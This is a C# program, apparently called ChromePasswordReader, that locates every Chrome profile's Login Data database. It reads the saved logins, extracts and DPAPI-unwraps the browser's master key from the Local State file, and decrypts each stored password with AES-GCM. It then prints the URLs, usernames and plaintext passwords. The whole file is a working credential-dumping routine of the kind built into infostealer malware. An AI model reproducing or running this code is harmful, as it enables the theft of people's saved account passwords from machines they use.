using System;
using System.Collections.Generic;
using System.Data.SQLite;
using System.IO;
using System.Security.Cryptography;
using System.Text;

namespace ChromePasswordReader
{
    class Program
    {      

        static void Main(string[] args)
        {
            string LocalApplicationData = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData);

            string DirectoryPath = LocalApplicationData + @"\Google\Chrome\User Data";

            //Console.WriteLine("Hello World!");
            string cs = @"URI=file:C:\Users\vjbla\AppData\Local\Google\Chrome\User Data\Default\Login Data";

            List<string> loginDataFiles = new List<string>
            {
                DirectoryPath + @"\Default\Login Data",
                DirectoryPath + @"\Login Data"
            };

            if (Directory.Exists(DirectoryPath))
            {
                foreach (string dir in Directory.GetDirectories(DirectoryPath))
                {
                    if (dir.Contains("Profile"))
                        loginDataFiles.Add(dir + @"\Login Data");
                }
            }
            try
            {

                foreach (string loginFile in loginDataFiles.ToArray())
                {
                     //Console.WriteLine("login file:" + loginFile);
                    using var con = new SQLiteConnection(@"URI=file:" + loginFile);

                    con.Open();
                    SQLiteDataReader rdr = null;

                    try
                    {
                        using var cmd = new SQLiteCommand(con);
                        cmd.CommandText = "SELECT origin_url, action_url, username_value,password_value from logins ;";
                        rdr = cmd.ExecuteReader();
                    }
                    catch (Exception e)
                    {
                        continue;
                    }


                    while (rdr.Read())
                    {
                        string password;

                        //string encrypted_string = System.Text.Encoding.Unicode.GetString(encrypted_pass);
                        string encrypted_string = rdr.GetString(3);
                        //Console.WriteLine("encrypted_string:" + encrypted_string);

                        if (encrypted_string.StartsWith("v10") || encrypted_string.StartsWith("v11"))
                        {
                            //Local State file located in the parent folder of profile folder.

                            byte[] masterKey = GetMasterKey(Directory.GetParent(loginFile).Parent.FullName);

                            if (masterKey == null)
                                continue;

                            password = DecryptWithKey(Encoding.Default.GetBytes(encrypted_string), masterKey);
                        }
                        else
                        {
                            password = Encoding.UTF8.GetString(ProtectedData.Unprotect(Encoding.Default.GetBytes(encrypted_string), null, DataProtectionScope.CurrentUser));
                        }
                        Console.WriteLine($@"{rdr.GetString(0),3},{rdr.GetString(1),-8},{rdr.GetString(2),8},{password,16}");
                         //Console.WriteLine("password:" + password);

                    }               

                }
            }
            catch(Exception e)
            {
                 Console.WriteLine(e.ToString());
            }
        }

        public static byte[] GetMasterKey(string LocalStateFolder)
        {
            //Key saved in Local State file
            string filePath = LocalStateFolder + @"\Local State";
            byte[] masterKey = new byte[] { };

            if (File.Exists(filePath) == false)
                return null;

            //Get key with regex.
            var pattern = new System.Text.RegularExpressions.Regex("\"encrypted_key\":\"(.*?)\"", System.Text.RegularExpressions.RegexOptions.Compiled).Matches(File.ReadAllText(filePath));

            foreach (System.Text.RegularExpressions.Match prof in pattern)
            {
                if (prof.Success)
                    masterKey = Convert.FromBase64String((prof.Groups[1].Value)); //Decode base64
            }

            //Trim first 5 bytes. Its signature "DPAPI"
            byte[] temp = new byte[masterKey.Length - 5];
            Array.Copy(masterKey, 5, temp, 0, masterKey.Length - 5);

            try
            {
                return ProtectedData.Unprotect(temp, null, DataProtectionScope.CurrentUser);
            }
            catch (Exception ex)
            {
                 Console.WriteLine(ex.ToString());
                return null;
            }
        }

        public static string DecryptWithKey(byte[] encryptedData, byte[] MasterKey)
        {
            byte[] iv = new byte[] { 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0 }; // IV 12 bytes

            //trim first 3 bytes(signature "v10") and take 12 bytes after signature.
            Array.Copy(encryptedData, 3, iv, 0, 12);

            try
            {
                //encryptedData without IV
                byte[] Buffer = new byte[encryptedData.Length - 15];
                Array.Copy(encryptedData, 15, Buffer, 0, encryptedData.Length - 15);

                byte[] tag = new byte[16]; //AuthTag
                byte[] data = new byte[Buffer.Length - tag.Length]; //Encrypted Data

                //Last 16 bytes for tag
                Array.Copy(Buffer, Buffer.Length - 16, tag, 0, 16);

                //encrypted password
                Array.Copy(Buffer, 0, data, 0, Buffer.Length - tag.Length);
                //Console.WriteLine("tag:" + System.Text.Encoding.Default.GetString(tag));

                AesGcm aesDecryptor = new AesGcm();
                var result = Encoding.UTF8.GetString(aesDecryptor.Decrypt(MasterKey, iv, null, data, tag));

                return result;
            }
            catch (Exception ex)
            {
                 Console.WriteLine(ex.ToString());
                return null;
            }
        }   

        
    }
}
